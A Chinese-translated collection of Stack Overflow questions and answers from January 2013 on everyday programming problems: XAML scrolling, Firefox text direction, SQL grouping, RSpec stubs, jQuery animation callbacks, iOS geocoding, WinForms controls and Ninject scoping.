回答我自己的问题...我在另一个论坛上得到了答案。该讨论的链接如下 [http://www.answers.opencv.org/question/6206/opencv4android-conversion-from-matofkeypoint-to/](http://www.answers.opencv.org/question/6206/opencv4android-conversion-from-matofkeypoint-to/)

# xaml - 当内容不超过父级的高度时，ScrollViewer 不滚动

> ID：14346485
> 
> 赞同：0
> 
> 时间：2013-01-15T20:39:40.753
> 
> 标签：xaml, scroll, windows-phone-8, scrollviewer

在这个 XAML 中，我可以上下滚动`Contents`网格，即使它不超过`ScrollViewer`高度。

```
<Grid>
    <Grid.RowDefinitions>
        <RowDefinition Height="80" />
        <RowDefinition Height="*" />
    </Grid.RowDefinitions>

    <Grid x:Name="Controller" Grid.Row="0">
        <controls:SearchField x:Name="Searcher" />
    </Grid>

    <ScrollViewer x:Name="Scroller" Grid.Row="1">
        <ScrollViewer.Content>
            <Grid x:Name="Contents">
                <TextBlock Text="HI" />
            </Grid>
        </ScrollViewer.Content>
    </ScrollViewer>
</Grid> 
```

我想这是某种标准行为，但我不太喜欢它。`ScrollViewer`如果内容不超过`ScrollViewer`' 高度，是否可以不滚动其内容？

# html - dir="auto" 在 Firefox 中无法按预期工作

> ID：14346486
> 
> 赞同：2
> 
> 时间：2013-01-15T20:39:48.917
> 
> 标签：html, firefox, css

我正在构建一个 Web 应用程序，在输入文本框中添加 dir="auto" 以自动检测文本方向，它可以在 Chrome 和 Firefox 中找到。

当我稍后显示该文本时，我在容器中使用 dir="auto"（p、span 等）。它在 Chrome 中运行良好，但文本始终在 Firefox 中显示 LTR。（如果我手动将其更改为 dir="rtl" 它可以在 Firefox 中使用，但我希望它是自动的）

我怎样才能解决这个问题 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:59:14.143

不幸的是，Firefox (Gecko)**不正确支持**[HTML5 dir 属性](http://www.w3.org/html/wg/drafts/html/master/dom.html#the-dir-attribute)，该属性指定元素的文本方向。这是一个[已知错误](https://bugzilla.mozilla.org/show_bug.cgi?id=548206)，已于 2012 年 11 月 26 日标记为已解决。

它将**在 Firefox20**（里程碑）中实现。[Firefox20 于2013-02-18](https://wiki.mozilla.org/Releases#Based_on_Gecko_20)周移至 BETA 。

您可以使用 gecko `document.defaultView`( [MDN](https://developer.mozilla.org/en-US/docs/DOM/document.defaultView) ) 检测客户端的默认 dir 属性：

```
// get ltr or rtl
var dir = document.defaultView.getComputedStyle(document.documentElement,null); 
```

# .net - 如何在 Visual Studio 2012 中查看类/方法的 IL

> ID：14346494
> 
> 赞同：1
> 
> 时间：2013-01-15T20:40:25.103
> 
> 标签：.net, visual-studio-2012, il

我有很好的 VS2010 扩展（我认为称为 Ndasm）。但是它与 VS2012 不兼容。

有没有办法可以在设计时立即查看类或方法的 IL？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:44:10.537

您可以尝试[从 Codeplex 将源代码下载到 NDasm](http://ndasm.codeplex.com/SourceControl/changeset/view/f05278a57f5a)并尝试为 VS2012 构建它。试试看，这就是开源很酷的原因。

或者，还有用于查看 IL 代码的外部工具。
[.NET Reflector](http://www.reflector.net/)（非免费）
[JustDecompile](http://www.telerik.com/products/decompiler.aspx)（免费）

注意：[dotPeek](http://www.jetbrains.com/decompiler/)目前不支持查看 IL，但可以在[此处](http://youtrack.jetbrains.com/issue/DOTP-286)查看和/或投票支持该功能/问题。

# ruby-on-rails-3 - 在 Rails 控制器操作中使用 RSpec 将参数传递给模拟模型方法的问题

> ID：14346496
> 
> 赞同：2
> 
> 时间：2013-01-15T20:40:33.313
> 
> 标签：ruby-on-rails-3, mocking, rspec-rails

我正在尝试模拟用户模型保存方法以返回 false，并模拟控制器在验证失败的情况下会做什么。

我的规格看起来像：

```
require 'spec_helper'

describe UsersController do
  describe 'POST create_email_user' do
    it 'responds with errors json if saving the model fails' do
      @params = {
        :last_name => 'jones',
        :email => 'asdfasdfasfd@'
      }
      User.stub(:new_email_user) .with(@params) .and_return(@mock_user)

      @mock_user.stub(:save) .and_return(false)

      post :create_email_user, :user => @params, :format => :json

      response.body.should == @mock_user.errors.as_json
      response.status.should == :unprocessable_entity
    end
  end
end 
```

控制器动作如下所示：

```
class UsersController < ApplicationController
  def create_email_user
    @user = User.new_email_user(params[:user])
    if @user.save
      # code left out for demo purposes
    else
      render json: @user.errors, status: :unprocessable_entity
    end
  end
end 
```

运行此规范时，我得到的错误基本上是说对 new_email_user 的预期调用得到了错误的参数：

```
 1) UsersController POST create_email_user responds with errors json if saving the model fails
     Failure/Error: post :create_email_user, :user => @params, :format => :json
       <User(id: integer, email: string, encrypted_password: string, reset_password_token: string, reset_password_sent_at: datetime, remember_created_at: datetime, sign_in_count: integer, current_sign_in_at: datetime, last_sign_in_at: datetime, current_sign_in_ip: string, last_sign_in_ip: string, created_at: datetime, updated_at: datetime, uid: string, provider: string, first_name: string, last_name: string, registration_id: integer, gender: string, authentication_token: string) (class)> received :new_email_user with unexpected arguments
         expected: ({:last_name=>"jones", :email=>"asdfasdfasfd@"})
              got: (["last_name", "jones"], ["email", "asdfasdfasfd@"])
        Please stub a default value first if message might be received with other args as well. 
```

似乎 rails 将 has 转换为键值对数组，而我的代码只是在设置中使用直接哈希。

如何模拟这种转换为数组，或者我做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:47:40.487

将`.with`存根放在用户身上，因为它与测试并不真正相关并且会导致问题。

没有`.with`stub 将为任何参数返回该值。所以：

```
User.stub(:new_email_user).and_return(@mock_user) 
```

然后我会有一个单独的规范来确保：

`User.should_receive(:new_email_user).with(@params)`

并以它自己的、狭隘的规范来诊断这个问题。

# wpf - WPF - 按钮控件模板...当 Command.CanExecute 为 false 时保持模板项启用

> ID：14346498
> 
> 赞同：0
> 
> 时间：2013-01-15T20:40:41.090
> 
> 标签：wpf, command, datatemplate, controltemplate, canexecute

我有一个 listView，其中每个项目都包含一个包含 Button 的 dataTemplate。这是由于要求单击列表项将像单击按钮一样使您进入“向导”的下一步。

DataTemplate 中的每个 Button 都包含一个 ControlTemplate。

当命令的 CanExecute 为 false 时，此 controlTemplate 中的项目将被禁用。特别是在我下面的示例中，Button 模板内的 Button（以图像为模板的那个）也被禁用。

即使禁用了与该按钮关联的命令，如何保持模板内的项目处于启用状态。

摘要：按钮的模板包含另一个按钮。当父按钮的命令被禁用时，模板内的按钮被禁用。

XAML：

```
<ListView.ItemTemplate>
    <DataTemplate>                
        <Button Name="nextButton" Height="30" Command="{Binding RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type Wiz:edited}}, Path=DataContext.ACommand}" CommandParameter="{Binding}">
              <Button.Template>
                <ControlTemplate>                     
                   <StackPanel Orientation="Horizontal">
                      <Label Content="{Binding}"/>
                      <Button>
                         <Button.Template>
                            <ControlTemplate>
                                <Image Source="{Binding source}"/>
                            </ControlTemplate>
                         </Button.Template>
                      </Button>
                   </StackPanel>
                </ControlTemplate>                    
              </Button.Template>
            </Button>
    </DataTemplate>
</ListView.ItemTemplate> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:19:53.063

**ButtonBase**挂钩与其关联的**Command的****CanExecute**。当 CanExecute 返回 false 时，ButtonBase 缓存它并从其**IsEnabledCore**返回 false，从而禁用 ButtonBase。当一个元素被禁用时，它的后代也被禁用。如果您不希望它被禁用，那么您不应该将它与命令相关联（例如挂钩单击）或不使用 CanExecute 将为假的命令（例如使用从CanExecute 但不调用包装命令的执行）或不将其他元素放在按钮内（创建/使用一些附加行为，当单击列表项时将执行命令）。

# sql - sql只合并一些重复项

> ID：14346501
> 
> 赞同：2
> 
> 时间：2013-01-15T20:40:52.470
> 
> 标签：sql, sql-server

我想合并我表中的一组重复项，但不是全部。

例子：

```
acct    date     bal
--------------------
123   1/1/2013   40.00
123   1/1/2013   2.00
456   1/2/2013   50.00
456   1/1/2013   5.00
789   1/1/2013   10.00
789   1/1/2013   17.00 
```

我想将 acct 123 合并到只有一行，将这些行的余额相加，但留下其余的。

所需的输出：

```
acct    date     bal
--------------------
123   1/1/2013   42.00
456   1/2/2013   50.00
456   1/1/2013   5.00
789   1/1/2013   10.00
789   1/1/2013   17.00 
```

在 SQL Server 2005 中工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:46:35.497

在 GROUP BY 子句中使用 CASE

```
SELECT acct, date, SUM(bal) AS bal
FROM dbo.tets73
GROUP BY acct, date, CASE WHEN acct != 123 THEN bal END 
```

[**SQLFiddle**](http://sqlfiddle.com/#!3/0ebf2/2/0)上的演示[](http://sqlfiddle.com/#!3/0ebf2/2/0)

 *** * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T20:50:10.120

```
SELECT acct, date, SUM(bal)
FROM T
WHERE acct = 123

UNION

SELECT acct, date, bal
FROM T
WHERE acct <> 123 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T20:44:18.430

```
 select acct, date, sum(bal) from table where acct = 123
 union
 select acct, date bal from table where acct <> 123 
```**

# javascript - 我应该将断点放在 chrome 开发人员工具中的哪个位置？

> ID：14346504
> 
> 赞同：0
> 
> 时间：2013-01-15T20:41:02.440
> 
> 标签：javascript, google-chrome

我对 chrome 开发人员工具很陌生，我注意到当我输入断点并刷新页面时，有时页面会在断点处暂停，有时则不会。断点必须在函数内还是函数外才能让应用程序在断点处暂停？我试图检查并查看某些值是否已定义或未定义..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:44:06.290

A`breakpoint`告诉调试器在执行到达带有 said 的语句时停止，`breakpoint`并且可以放置在任何[`statement`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Statements).

> 断点必须在函数内还是函数外才能让应用程序在断点处暂停？

取决于您要*调试*的内容。如果您希望在页面到达`function` *定义*`breakpoint`时停止执行，请在*“外部”*上设置 a 。但是，如果您想在调用函数时中断，请将其设置*在*`function`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:44:55.700

断点应该在任何地方都可以正常工作，只要代码是单步执行的。

如果您遇到严重问题，可以考虑使用非标准`debugger`关键字。这几乎可以模拟断点的功能，除了您在实际代码中而不是在开发人员工具中设置它们。

例如：

```
function test(y) {
    debugger;

    var x = y;
} 
```

*（与所有以开发人员为中心的 JavaScript 功能（即`console.log`）一样，不要忘记从生产代码中删除）*

# php - 使用 php dom 操作 html 导航

> ID：14346508
> 
> 赞同：0
> 
> 时间：2013-01-15T20:41:17.990
> 
> 标签：php, dom, xpath

我需要将类添加到从自定义 CMS 中的函数输出的导航 HTML。

获得所需输出的唯一方法是使用 PHP 解析 HTML。

我正在使用 PHP 的 DOM 方法来查看 HTML 并向任何`<li>`包含子元素`<ul>`（顶级导航项）的元素添加一个类。

到目前为止它正在工作，但我有两个问题：

1.  有没有更有效的方法让我浏览这些 DOM 数据？这对我来说似乎很麻烦，但这可能只是我缺乏经验。

2.  在某些情况下，我的`<li>`元素可能已经有一个类，我怎样才能添加到现有的类属性而不破坏可能已经存在或不存在的内容？

-

```
 <?
        $mcms_nav = getContent(
            // call to cms that returns navigation html as a string
            // ex. <ul id="pnav"><li><a href="/">home</a></li>....</ul>
        );

        $dom = new DOMDocument();
        $dom->preserveWhiteSpace = FALSE;
        $dom->loadHTML($mcms_nav);

        $x = new DOMXPath($dom);
        foreach($x->query('//ul/li/ul') as $node)
        {
            $parent = $node->parentNode;
            $parent_attr = $dom->createAttribute('class');
            $parent_attr->value = 'has-flyout';
            $parent->appendChild($parent_attr);

            $flyout_attr = $dom->createAttribute('class');
            $flyout_attr->value = 'flyout';
            $node->appendChild($flyout_attr);
        }

        $mcms_nav = $dom->getElementByID('pnav');
        echo $dom->saveHTML($mcms_nav);
    ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:47:37.363

1.  并不真地。您可以从 CakePHP 框架中获取 XML 类，将其转换为一个数组，操作该数组，然后将其返回。不确定这是否适合您的情况。[http://book.cakephp.org/2.0/en/core-utility-libraries/xml.html](http://book.cakephp.org/2.0/en/core-utility-libraries/xml.html)

2.  您可以使用`dom->hasAttribute()`and`dom->getAttribute()`获取现有的属性内容（如果存在）。

此外，一份新工作也不会受到伤害；）

# batch-file - Xcopy 只显示文件名。不是完整的目录路径

> ID：14346509
> 
> 赞同：3
> 
> 时间：2013-01-15T20:41:26.107
> 
> 标签：batch-file, path, directory, dos, xcopy

通过 Xcopy（通过批处理）复制文件以输出被复制文件的文件名时的任何方式 - 或者更好的是，基本文件夹和文件名 - 而不是整个目录路径？

批量使用`%USERPROFILE%\Desktop`，然后解析到`C:\Documents and Settings\Username\`桌面。然后就是文件夹所在的位置，其中包含要复制的文件和目录。当然，当它复制时，您会`C:\Documents and Settings\Username\Desktop\TheFolder\SubFolder\filename.txt` 在输出窗口中看到，每个副本占用 2 行，当您试图查看它的位置时，它看起来很糟糕。

我只想看到`SubFolder\filename.txt`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:19:22.177

使用 cd /folder 切换到源文件夹（或上面的一个），并且在 xcopy 语句中，不要包含整个路径。

例如，而不是这个......

```
xcopy c:\tmp\q\z\*.* c:\destfolder 
```

...做这个：

```
cd \tmp\q
xcopy z\*.* c:\destfolder 
```

并从桌面复制：

```
cd %userprofile%
xcopy desktop\*.* c:\destfolder 
```

# c# - 获取 Groupbox 的真正可用区域

> ID：14346511
> 
> 赞同：6
> 
> 时间：2013-01-15T20:41:36.257
> 
> 标签：c#, winforms

在 Windows 窗体中，当我将标签控件放置`Y=0`在组框内时，标签与组框顶部的标题文本相交。

如何获得 中的可用区域`Groupbox`，即没有被框的标题文本阻挡的区域？

设置`control.Y = groupBox.Padding`.Top 不起作用。并且`Groupbox.ClientRectangle`也不考虑文本。

![解释](../Images/01e75bab32d5525efc11b71142fa285b.png)

编辑：有一个简单的技巧来获得那个内部矩形：只需`Label`在 中放置一个`GroupBox`，并将它的`Dock`属性设置为 Fill。然后你可以从面板中获取相关信息（上/下/左/右），或者干脆直接使用面板添加你的子控件。但是，我仍然想知道如何在没有这种黑客攻击的情况下获得这些坐标。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:50:43.020

尝试使用[DisplayRectangle](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.displayrectangle.aspx)属性：

> DisplayRectangle 属性返回控件显示区域的客户矩形。对于基本控件类，这等于客户矩形。但是，如果控件的客户区与显示区不同，继承控件可能需要更改此设置。显示矩形是包围控件的最小矩形，用于布局控件。

例子：

```
label1.Location = groupBox1.DisplayRectangle.Location; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-03-30T11:49:47.657

相当老的线程，但这是我用于控件的内容：

```
label1.Location = new Point(0,(int)(groupBox1.Font.Size)*2); 
```

[![HeaderWithBigText](../Images/d918d3149c418388d9e8c61a517de65c.png)](https://i.stack.imgur.com/1o8oF.png)

[![HeaderWithSmallText](../Images/0e9abe50e3723c1a85d5e9e2d5c7c5fe.png)](https://i.stack.imgur.com/8qQj1.png)

这就是它在不同文本大小下的外观。

# jquery - JQuery 为多个 div 设置动画并在其中写入文本

> ID：14346515
> 
> 赞同：1
> 
> 时间：2013-01-15T20:41:54.087
> 
> 标签：jquery, html, animation

我正在努力解决我给自己提出的一个小问题。我知道在 SO 上有很多关于 jquerys animation() 方法的问题，但我没有找到任何类似的问题。在相反的情况下，请原谅。

首先，它应该如何工作：

我有十个`div`s，它们的宽度应该分别设置为动画。在该动画结束后，应在其中写入一些文本淡入。

这`div`得到了 id userBar1, ..., userBar10。我试图用回调方法解决它

```
for(var i=0; i<barLengths.length; i++){
    var length = barLengths[i];
    $("#userBar"+(i+1)).animate({width: length+"px"}, function(){
        var t = new Number(usValues[i]).toFixed(2);
        $("#userBar"+(i+1)).html("CHF").fadeIn();
    });
} 
```

而 barLengths 是一个数组，其中包含条应动画到的宽度。这导致没有文本附加到`div`s 中。使用时也一样`text(...)`。如果我不将写入`div`s 的内容放入回调方法中，一切正常，但文本在动画开始时已经可见。

检查这个[小提琴](http://jsfiddle.net/Vj8hy/)。如您所见，前十个条的动画效果很好，但没有附加任何文本。对于其他相同的事情，但文本被附加到早期。如何正确解决这个问题，包括文本的淡入？甚至可以淡入文本而不将其包装成另一个`div`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:52:06.710

修正： http: [//jsfiddle.net/Vj8hy/2/](http://jsfiddle.net/Vj8hy/2/)

文本中的淡入不能是循环`$.animate`内的回调。`for`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:53:11.320

改变这个位

```
$(".bar").each(function(i){
$(this).animate({width: lengths[i]+"px"}, function(){
   $("#bar"+(i+1)).html(values[i]);
  console.log("#bar"+(i+1));// same thing with text()
}); 
```

});

你应该很好。虽然淡入淡出**需要**额外的 div 等。

[http://jsfiddle.net/MrzRx/3/](http://jsfiddle.net/MrzRx/3/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:57:05.130

您需要添加一个元素，文本节点不能动画。

```
(function go(i) {
   $("#bar"+(i+1)).animate({width: lengths[i]+"px"}, function(){
      $('<span>'+values[i]+'</span>').hide().appendTo(this).fadeIn();
      if (i < lengths.length) go(i+1);
   });
})(0) 
```

[http://jsfiddle.net/kkrYR/](http://jsfiddle.net/kkrYR/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T21:00:08.480

您的示例不起作用的原因是`i`不在回调函数的范围内。您可以在该回调函数中再次循环，但其他海报是正确的，淡入淡出效果将需要另一个 div。

[http://jsfiddle.net/mxDv7/1/](http://jsfiddle.net/mxDv7/1/)

# ios - 使用 reverseGeocodeLocation: 设置地址字符串并从方法返回

> ID：14346516
> 
> 赞同：1
> 
> 时间：2013-01-15T20:41:55.173
> 
> 标签：ios, objective-c, cocoa-touch, clgeocoder, completionhandler

我正在尝试将起点和终点本地化为地址字符串，以便可以将其存储到`NSUserDefaults`. 问题是该方法继续执行并且没有设置我的变量。

```
NSLog(@"Begin");

__block NSString *returnAddress = @"";

[self.geoCoder reverseGeocodeLocation:self.locManager.location completionHandler:^(NSArray *placemarks, NSError *error) {
    if(error){
        NSLog(@"%@", [error localizedDescription]);
    }

    CLPlacemark *placemark = [placemarks lastObject];

    startAddressString = [NSString stringWithFormat:@"%@ %@\n%@ %@\n%@\n%@",
                          placemark.subThoroughfare, placemark.thoroughfare,
                          placemark.postalCode, placemark.locality,
                          placemark.administrativeArea,
                          placemark.country];
    returnAddress = startAddressString;

    //[self.view setUserInteractionEnabled:YES];
}];
NSLog(returnAddress);

NSLog(@"Einde"); 
```

这是我的应用程序调试器显示的内容：

> 开始
> _

例如，如果我的地址是：“Mainstreet 32​​, CITY”。那么我想看到的是以下内容：

> 开始
> Mainstreet 32​​, CITY
> Einde

问题是我的代码没有等待我`CLGeocoder`完成，所以我的变量`returnAddress`在返回时没有设置，它是空的。

有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T20:53:21.340

因为`reverseGeocodeLocation`有一个完成块，所以当执行到达它时它被移交给另一个线程 - 但主线程上的执行仍将继续到下一个操作，即`NSLog(returnAddress)`. 此时，`returnAddress`尚未设置，因为`reverseGeocodeLocation`刚刚移交给另一个线程。

使用完成块时，您必须开始考虑异步工作。

考虑作为方法中的最后一个操作离开`reverseGeocodeLocation`，然后使用完成块内的其余逻辑调用新方法。这将确保在您获得`returnAddress`.

```
- (void)someMethodYouCall 
{
    NSLog(@"Begin");
    __block NSString *returnAddress = @"";

    [self.geoCoder reverseGeocodeLocation:self.locManager.location completionHandler:^(NSArray *placemarks, NSError *error) {
        if(error){
            NSLog(@"%@", [error localizedDescription]);
        }

        CLPlacemark *placemark = [placemarks lastObject];

        startAddressString = [NSString stringWithFormat:@"%@ %@\n%@ %@\n%@\n%@",
                              placemark.subThoroughfare, placemark.thoroughfare,
                              placemark.postalCode, placemark.locality,
                              placemark.administrativeArea,
                              placemark.country];
        returnAddress = startAddressString;

        //[self.view setUserInteractionEnabled:YES];

        NSLog(returnAddress);
        NSLog(@"Einde");

        // call a method to execute the rest of the logic 
        [self remainderOfMethodHereUsingReturnAddress:returnAddress];
    }];
// make sure you don't perform any operations after reverseGeocodeLocation.
// this will ensure that nothing else will be executed in this thread, and that the
// sequence of operations now follows through the completion block.
}

- (void)remainderOfMethodHereUsingReturnAddress:(NSString*)returnAddress {
   // do things with returnAddress.
} 
```

或者您可以使用 NSNotificationCenter 在完成时发送通知`reverseGeocodeLocation`。您可以在其他任何需要的地方订阅这些通知，并从那里完成逻辑。替换`[self remainderOfMethodHereWithReturnAddress:returnAddress];`为：

```
NSDictionary *infoToBeSentInNotification = [NSDictionary dictionaryWithObject:returnAddress forKey:@"returnAddress"];

[[NSNotificationCenter defaultCenter] 
    postNotificationName:@"NameOfNotificationHere" 
    object:self
    userInfo: infoToBeSentInNotification];
    }]; 
```

[这](https://stackoverflow.com/questions/2191594/send-and-receive-messages-through-nsnotificationcenter-in-objective-c)是使用 NSNotificationCenter 的示例。

# c# - 更改 DataGridCheckBoxCell C# Winform 的复选框的颜色

> ID：14346521
> 
> 赞同：0
> 
> 时间：2013-01-15T20:42:11.280
> 
> 标签：c#, winforms, datagridview, paint, datagridviewcheckboxcell

我前段时间问过这个问题[Hide some datagridview checkbox cell](https://stackoverflow.com/questions/14124033/hide-some-datagridview-checkbox-cell)。我无法得到一个好的答案，所以我决定尝试一些不同的东西。

我有一个包含所有贷款分期付款的网格。每期都有一个复选框。当该复选框被选中时，我表示客户正在为此付费。

现在，当已支付分期付款时，不需要该复选框。现在，我禁用了分期付款复选框。它是可见的，但单击时它什么也不做。但我想做的是将复选框涂成绿色。就像在这张图片中一样（颜色是用 Paint 绘制的，它不是真实的图像）

![在此处输入图像描述](../Images/6b01791009d0f0b5af8cfff25d6637cc.png)

好的，我尝试在使用此代码之前隐藏复选框：

```
private void dgv_Cuotas_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
    {           
        if (e.RowIndex >= 0 && e.ColumnIndex >= 0)
        {
            if (dgv_Cuotas.Columns[e.ColumnIndex].Name == "Seleccionar" && Convert.ToBoolean(dgv_Cuotas.Rows[e.RowIndex].Cells["pagada"].Value) == true)
            {
                e.CellStyle.BackColor = Color.Green;
                e.PaintBackground(e.ClipBounds, true);
                e.Handled = true;
            }
        }
    } 
```

![在此处输入图像描述](../Images/4703e7eec621660241753a014209bd6f.png)

有了这个我画了整个单元格，但我只想画复选框。此外，通过此实现，当我单击该单元格时，我可以注意到我正在单击一个复选框，并且背景颜色变为白色，如下所示：

![在此处输入图像描述](../Images/9abd21f8dbbf29d3d42f52c35e6ede6e.png)

我通过在运行时分配 Datasource = lista_cuota（分期付款列表）来创建 DataGridView（dgv_Cuotas）行和列。这就是为什么通过代码在其后添加复选框列的原因：

```
DataGridViewCheckBoxColumn chbox = new DataGridViewCheckBoxColumn();
        {
            chbox.CellTemplate = new DataGridViewCheckBoxCell();
            chbox.HeaderText = "";
            chbox.Name = "Seleccionar";
            chbox.AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
            chbox.FlatStyle = FlatStyle.Standard;
        }
        dgv_Cuotas.Columns.Insert(16, chbox);
        dgv_Cuotas.Columns[16].DisplayIndex = 0; 
```

这样做，我不能“隐藏”将 DataGridViewTextBoxCell 分配给特定单元格的复选框单元格，所以我想尝试只绘制复选框。

当我使用实体框架时，我不想在类中添加新字段。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T16:41:10.007

通过我所有的研究，我得出结论，改变 CheckBoxCell 的颜色是不可能的。我可以通过绘制一个相同大小的矩形来模拟它。我在我的另一个问题中编写了该解决方案[在 C# Winforms 中的 DataGridViewCell 内绘制一个实心圆或矩形](https://stackoverflow.com/questions/14349624/drawing-a-filled-circle-or-rectangle-inside-a-datagridviewcell-in-c-sharp-winfor)

# ruby-on-rails - collection_select NoMethodError - 切换到 rails 3.2.11 后注意到

> ID：14346532
> 
> 赞同：0
> 
> 时间：2013-01-15T20:42:33.453
> 
> 标签：ruby-on-rails, view-helpers

更新到 rails 3.2.11 后，我注意到我的应用程序中的搜索表单存在问题。在看到“我们很抱歉，但出了点问题”之后。Heroku 上的消息，我检查了日志并注意到以下错误消息：

```
NoMethodError (undefined method `to_i' for ["2010"]:Array):
app/controllers/skis_controller.rb:29:in `index' 
```

这是指显示我的搜索结果的索引控制器。我对实际搜索表单使用了部分搜索表单，其中包含几个 collection_selects。

索引操作中的第 29 行指的是 model_year（上面搜索中的“2010”）。当我从 collection_select 中删除 model_year 字段时，一切正常（搜索后没有错误消息）。这就是 model_year collection_select 的样子：

```
<%= collection_select(:ski, :model_year, @model_years.sort_by(&:model_year).reverse, :model_year, :model_year, {}, :multiple => true, :class => "chzn-select", :'data-placeholder' => "Enter Model Year") %> 
```

这让我很烦恼，因为它在过去三周内一直运行良好。我最近更新到 rails 3.2.11 但我不肯定这是问题开始的时候（我知道我之前没有注意到它）。我查看了 collection_select 文档，一切似乎都很好。

model_year 以整数形式存储在数据库中，我已经通过 rails 控制台确认了这一点。

任何帮助或想法将不胜感激！谢谢

编辑 - 更新添加控制器代码：

```
def index

  @companies = Brand.scoped
  @ski_types = Ski.find(:all, :select => "DISTINCT ski_type")
  @genders = Ski.find(:all, :select => "DISTINCT gender")
  @names = Ski.find(:all, :select => "DISTINCT name")
  @price_ranges = PriceRange.scoped
  @model_years = Ski.find(:all, :select => "DISTINCT model_year")
  @sorts = ["Price", "Rating", "Availability"]

if params[:ski].present? || params[:brand].present? || params[:price_range].present?
# Creates references for collection select

  ski_type = params[:ski][:ski_type].reject(&:blank?)
  gender = params[:ski][:gender].reject(&:blank?)
  company = params[:brand][:company].reject(&:blank?)
  name = params[:ski][:name].reject(&:blank?)
  price_range = params[:price_range][:price_range]
  model_year = params[:ski][:model_year].reject(&:blank?)
  # raise ski_type.any?.inspect

  @ski = Ski.new
  @ski.ski_type = ski_type
  @ski.gender = gender
  @ski.name = name
  @ski.model_year = model_year

  @price_range = PriceRange.new
  @price_range.price_range = price_range

  @brand = Brand.new
  @brand.company = company

  skis = Inventory.search_price(price_range)

  skis_refined = Ski.search_characteristics(ski_type, gender, company, name, model_year)

  ski_ids2 = skis.map(&:id) & skis_refined.map(&:id)

  @all_skis = Ski.where(:id => ski_ids2)

  if params[:sort_by] == "Price Low to High"
    @overlapping_skis = Kaminari.paginate_array(@all_skis.joins(:inventories).order("inventories.price ASC").uniq_by(&:id)).page(params[:page]).per(30)
  elsif params[:sort_by] == "Price High to Low"
    @overlapping_skis = Kaminari.paginate_array(@all_skis.joins(:inventories).order("inventories.price DESC").uniq_by(&:id)).page(params[:page]).per(30)
  elsif params[:sort_by] == "Rating"
    @overlapping_skis = Kaminari.paginate_array(@all_skis.joins(:reviews).order("reviews.average_review DESC").uniq_by(&:id)).page(params[:page]).per(30)
  else
    @overlapping_skis = @all_skis.joins(:brand).order("brands.company ASC, skis.model_year DESC, skis.name ASC").page(params[:page])
  end

else
  @overlapping_skis = Ski.joins(:brand).order("brands.company ASC, skis.model_year DESC, skis.name ASC").page(params[:page])
end

respond_to do |format|
  format.html # index.html.erb
  format.json { render json: @skis }
end
end 
```

更新搜索方法：

```
def self.search_characteristics(ski_type, gender, company, name, model_year)
@skis = Ski.scoped
if ski_type.any?
    @skis = @skis.where(:ski_type => ski_type)
end
if gender.any?
  @skis = @skis.where(:gender => gender)
end
if company.any?
  brand_object = Brand.where(:company => company)

  @id_array = brand_object.map(&:id)

  @skis = @skis.where(:brand_id => @id_array)
end
if name.any?
  @skis = @skis.where(:name => name)
end
if model_year.any?
  @skis = @skis.where(:model_year => model_year)
end
return @skis
 end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:15:29.417

你有`:multiple => true`，这意味着model_year可以有多个选定的值，这就是它是一个数组的原因。您必须以某种方式处理这些多个值或删除`:multiple => true`.

# c# - 使用 Ninject Dependency Creator 和 Event Broker 进行生命周期管理

> ID：14346534
> 
> 赞同：3
> 
> 时间：2013-01-15T20:42:38.813
> 
> 标签：c#, asp.net-mvc-3, ninject, ninject.web.mvc, ninject-extensions

我在一个相当大的项目中使用 Ninject，并希望利用[Dependency Creation](https://github.com/ninject/ninject.extensions.dependencycreation/blob/master/ReadMe.txt)和 Event Broker 扩展。

依赖创建自述文件给出了以下示例（尽管我相信`InCreatorScope`可能已重命名为`InDependencyCreatorScope`现在）

```
this.kernel.Bind<IParent>().To<Parent>();
this.kernel.DefineDependency<IParent, Dependency>();
this.kernel.Bind<Dependency>().ToSelf().InCreatorScope(); 
```

这个例子通过容器创建了一个依赖关系，它们之间`Parent`和`Dependency`没有它们之间的“硬”引用。这促进了组件之间的松散耦合，并允许我使用 Event Broker 来发布事件`Parent`并订阅它`Dependency`，而无需显式连接事件处理程序。

我的问题是：如果`Dependency`注入其他对象并且我希望它具有`RequestScope`标准激活的生命周期怎么办？我如何声明我想使用 Request 范围进行标准激活，但在创建时使用依赖创建者范围`Parent`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T05:32:00.760

您可以使用条件绑定：

```
// dedine dependency as before
this.kernel.Bind<Dependency>().ToSelf().When(r => r.Parameters.OfType<DependencyCreationParameter>().Any()).InDependencyCreatorScope();
this.kernel.Bind<Dependency>().ToSelf().When(r => !r.Parameters.OfType<DependencyCreationParameter>().Any()).InRequestScope(); 
```

但是通常当您有一个基于事件代理的解决方案时，您可以简单地在事件代理中注册创建的具有`OnActivation`重载的对象，这使得创建复杂范围更容易。

# xcode - Xcode 4.5 -iOS- 读取应用程序内的电子邮件/更新文本字段

> ID：14346537
> 
> 赞同：1
> 
> 时间：2013-01-15T20:42:55.797
> 
